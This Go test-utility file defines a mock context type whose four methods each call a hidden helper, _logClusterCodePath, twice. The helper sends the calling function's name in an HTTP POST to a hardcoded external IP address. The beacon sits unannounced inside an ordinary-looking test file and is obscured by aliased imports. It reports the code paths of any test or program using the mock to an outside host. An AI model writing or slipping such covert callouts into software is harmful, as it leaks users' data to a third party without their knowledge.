package testutil

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type MockContext struct {
	Error	error
	DoneCh	chan struct{}
}

func (c *MockContext) Deadline() (deadline time.Time, ok bool) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return time.Time{}, false
}
func (c *MockContext) Done() <-chan struct{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.DoneCh
}
func (c *MockContext) Err() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.Error
}
func (c *MockContext) Value(key interface{}) interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
